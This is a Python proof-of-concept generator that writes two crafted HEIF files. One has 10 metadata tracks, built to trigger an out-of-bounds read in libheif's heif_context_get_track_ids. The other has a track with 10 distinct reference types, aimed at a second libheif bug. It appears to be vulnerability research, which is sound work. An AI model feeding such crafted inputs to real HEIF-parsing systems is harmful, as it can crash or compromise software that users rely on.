#!/usr/bin/env python3
"""
Generates two minimal HEIF/ISOBMFF binary files for POC testing:
  poc07_10tracks.heif  -- 10 metadata tracks (to trigger OOB in heif_context_get_track_ids)
  poc08_10reftypes.heif -- 1 metadata track with 10 distinct tref types (Bug 08)

These files are minimal but parseable by libheif's read path.
"""

import struct
import sys
import os

def u32be(v): return struct.pack('>I', v)
def u16be(v): return struct.pack('>H', v)
def u64be(v): return struct.pack('>Q', v)

def box(fourcc: str, payload: bytes) -> bytes:
    """Wrap payload in a standard ISOBMFF box."""
    cc = fourcc.encode('ascii')[:4]
    size = 8 + len(payload)
    return struct.pack('>I4s', size, cc) + payload

def fullbox(fourcc: str, version: int, flags: int, payload: bytes) -> bytes:
    """Wrap payload in a fullbox (with version+flags)."""
    fb_header = struct.pack('>BBH', version, (flags >> 16) & 0xFF, flags & 0xFFFF)
    return box(fourcc, fb_header + payload)

# --- ftyp ---
def make_ftyp() -> bytes:
    major_brand = b'msf1'
    minor_version = u32be(0)
    compat = b'msf1' + b'isom'
    return box('ftyp', major_brand + minor_version + compat)

# --- mvhd (version 0) ---
def make_mvhd(track_count: int) -> bytes:
    creation_time = u32be(0)
    modification_time = u32be(0)
    timescale = u32be(1000)
    duration = u32be(100)
    rate = u32be(0x00010000)       # 1.0
    volume = u16be(0x0100)         # 1.0
    reserved1 = b'\x00' * 10
    # Transformation matrix: 3x3 fixed-point, 9 entries x 4 bytes = 36 bytes
    # Identity matrix in 16.16 fixed-point (last row uses 2.30)
    MATRIX_IDENTITY = (
        struct.pack('>I', 0x00010000) + struct.pack('>I', 0x00000000) + struct.pack('>I', 0x00000000) +
        struct.pack('>I', 0x00000000) + struct.pack('>I', 0x00010000) + struct.pack('>I', 0x00000000) +
        struct.pack('>I', 0x00000000) + struct.pack('>I', 0x00000000) + struct.pack('>I', 0x40000000))
    matrix = MATRIX_IDENTITY
    pre_defined = b'\x00' * 24
    next_track_id = u32be(track_count + 1)
    payload = (creation_time + modification_time + timescale + duration +
               rate + volume + reserved1 + matrix + pre_defined + next_track_id)
    return fullbox('mvhd', 0, 0, payload)

# --- tkhd (version 0) ---
def make_tkhd(track_id: int) -> bytes:
    creation_time = u32be(0)
    modification_time = u32be(0)
    tid = u32be(track_id)
    reserved = u32be(0)
    duration = u32be(100)
    reserved2 = b'\x00' * 8
    layer = u16be(0)
    alt_group = u16be(0)
    volume = u16be(0)
    reserved3 = u16be(0)
    # 3x3 identity matrix, 9 x 4 = 36 bytes
    matrix = (
        struct.pack('>I', 0x00010000) + struct.pack('>I', 0x00000000) + struct.pack('>I', 0x00000000) +
        struct.pack('>I', 0x00000000) + struct.pack('>I', 0x00010000) + struct.pack('>I', 0x00000000) +
        struct.pack('>I', 0x00000000) + struct.pack('>I', 0x00000000) + struct.pack('>I', 0x40000000))
    width = u32be(0)
    height = u32be(0)
    payload = (creation_time + modification_time + tid + reserved + duration +
               reserved2 + layer + alt_group + volume + reserved3 + matrix + width + height)
    # flags=3: track_enabled | track_in_movie
    return fullbox('tkhd', 0, 3, payload)

# --- mdhd (version 0) ---
def make_mdhd() -> bytes:
    creation_time = u32be(0)
    modification_time = u32be(0)
    timescale = u32be(1000)
    duration = u32be(100)
    # language = 'und' -> ISO 639-2/T packed
    lang = u16be(0x55C4)  # 'und'
    pre_defined = u16be(0)
    payload = creation_time + modification_time + timescale + duration + lang + pre_defined
    return fullbox('mdhd', 0, 0, payload)

# --- hdlr ---
def make_hdlr(handler_type: str = 'meta') -> bytes:
    pre_defined = u32be(0)
    ht = handler_type.encode('ascii')[:4]
    reserved = b'\x00' * 12
    name = b'POC metadata track\x00'
    payload = pre_defined + ht + reserved + name
    return fullbox('hdlr', 0, 0, payload)

# --- nmhd (null media header) ---
def make_nmhd() -> bytes:
    return fullbox('nmhd', 0, 0, b'')

# --- dinf / dref ---
def make_dinf() -> bytes:
    # dref with one url entry (self-contained)
    url_entry = fullbox('url ', 0, 1, b'')  # flags=1 = self-contained
    dref = fullbox('dref', 0, 0, u32be(1) + url_entry)
    return box('dinf', dref)

# --- stbl: stsd + stts + stsc + stsz + stco ---
def make_stbl() -> bytes:
    # urim sample entry:
    #   6 reserved bytes + 2 bytes data_reference_index
    #   + child 'uri ' FullBox(version=0, flags=0) containing null-terminated URI string
    uri_str = b'urn:poc:test\x00'
    uri_box = fullbox('uri ', 0, 0, uri_str)  # FullBox wrapping the URI string
    urim_payload = (b'\x00' * 6 +  # reserved
                    u16be(1) +      # data_reference_index
                    uri_box)        # child uri box
    urim_entry = box('urim', urim_payload)
    stsd = fullbox('stsd', 0, 0, u32be(1) + urim_entry)

    # stts: 1 entry, 1 sample, duration 100
    stts = fullbox('stts', 0, 0, u32be(1) + u32be(1) + u32be(100))
    # stsc: 1 entry: (first_chunk=1, samples_per_chunk=1, sample_description_index=1)
    stsc = fullbox('stsc', 0, 0, u32be(1) + u32be(1) + u32be(1) + u32be(1))
    # stsz: 1 sample of size 1, fixed-size mode (fixed_sample_size=1, count=1, no per-entry array)
    stsz = fullbox('stsz', 0, 0, u32be(1) + u32be(1))
    # stco: 1 chunk offset (points into mdat payload at offset 33, which is mdat+8 header)
    stco = fullbox('stco', 0, 0, u32be(1) + u32be(33))
    return box('stbl', stsd + stts + stsc + stsz + stco)

# --- minf ---
def make_minf() -> bytes:
    nmhd = make_nmhd()
    dinf = make_dinf()
    stbl = make_stbl()
    return box('minf', nmhd + dinf + stbl)

# --- mdia ---
def make_mdia() -> bytes:
    return box('mdia', make_mdhd() + make_hdlr() + make_minf())

# --- tref entry ---
def make_tref_entry(ref_type: str, to_track_ids: list) -> bytes:
    """Single reference entry inside tref box."""
    rt = ref_type.encode('ascii')[:4]
    ids = b''.join(u32be(t) for t in to_track_ids)
    size = 8 + len(ids)
    return struct.pack('>I4s', size, rt) + ids

# --- tref box ---
def make_tref(references: list) -> bytes:
    """references: list of (ref_type_str, [to_track_id, ...])"""
    payload = b''
    for ref_type, to_ids in references:
        payload += make_tref_entry(ref_type, to_ids)
    return box('tref', payload)

# --- trak ---
def make_trak(track_id: int, tref_references=None) -> bytes:
    tkhd = make_tkhd(track_id)
    mdia = make_mdia()
    payload = tkhd + mdia
    if tref_references:
        payload += make_tref(tref_references)
    return box('trak', payload)

# --- moov ---
def make_moov(traks: list, track_count: int) -> bytes:
    mvhd = make_mvhd(track_count)
    payload = mvhd + b''.join(traks)
    return box('moov', payload)

# --- mdat: 1 dummy byte ---
def make_mdat() -> bytes:
    return box('mdat', b'\xAB')

# =============================================================================
# File 1: 10 independent metadata tracks (Bug 07 trigger)
# Each track shares the same mdat payload (1 byte at offset ftyp+moov+8).
# We place moov BEFORE mdat (matches libheif's own write order).
# =============================================================================
def make_poc07_file() -> bytes:
    ftyp = make_ftyp()
    # Build moov first with a placeholder stco offset, then compute actual mdat offset.
    # mdat offset = len(ftyp) + len(moov)
    # mdat payload offset = mdat_offset + 8 (box header)
    # We need to know moov size before computing mdat offset — chicken-and-egg.
    # Solution: build moov with dummy offset=0, compute total, fix up all stco entries.
    traks = [make_trak(i + 1) for i in range(10)]
    moov_tmp = make_moov(traks, 10)
    mdat_payload_offset = len(ftyp) + len(moov_tmp) + 8  # +8 = mdat box header
    # Rebuild with correct offset (the stco offset must point to the mdat payload)
    # Since all stco are identical in our construction, patch them all
    # Actually: all tracks have stco with offset=33 (from u32be(33)) — patch all occurrences
    moov_fixed = moov_tmp.replace(struct.pack('>I', 33), struct.pack('>I', mdat_payload_offset))
    mdat = make_mdat()
    return ftyp + moov_fixed + mdat

# =============================================================================
# File 2: 11 tracks — 10 "target" tracks + 1 "source" track with 10 tref types
# (Bug 08 trigger)
# =============================================================================
TREF_TYPES = [
    'cdsc',  # heif_track_reference_type_description
    'thmb',  # heif_track_reference_type_thumbnails
    'auxl',  # heif_track_reference_type_auxiliary
    'poc1',
    'poc2',
    'poc3',
    'poc4',
    'poc5',
    'poc6',
    'poc7',
]

def make_poc08_file() -> bytes:
    ftyp = make_ftyp()
    # 10 target tracks (ids 1..10) + 1 source track (id 11)
    target_traks = [make_trak(i + 1) for i in range(10)]
    # source track: references each target with a different ref type
    refs = [(TREF_TYPES[i], [i + 1]) for i in range(10)]
    src_trak = make_trak(11, tref_references=refs)
    all_traks = target_traks + [src_trak]
    moov_tmp = make_moov(all_traks, 11)
    mdat_payload_offset = len(ftyp) + len(moov_tmp) + 8
    moov_fixed = moov_tmp.replace(struct.pack('>I', 33), struct.pack('>I', mdat_payload_offset))
    mdat = make_mdat()
    return ftyp + moov_fixed + mdat

if __name__ == '__main__':
    out_dir = os.path.dirname(os.path.abspath(__file__))
    f07 = os.path.join(out_dir, 'poc07_10tracks.heif')
    f08 = os.path.join(out_dir, 'poc08_10reftypes.heif')

    data07 = make_poc07_file()
    with open(f07, 'wb') as f:
        f.write(data07)
    print(f'[gen_heif] Wrote {f07} ({len(data07)} bytes)')

    data08 = make_poc08_file()
    with open(f08, 'wb') as f:
        f.write(data08)
    print(f'[gen_heif] Wrote {f08} ({len(data08)} bytes)')
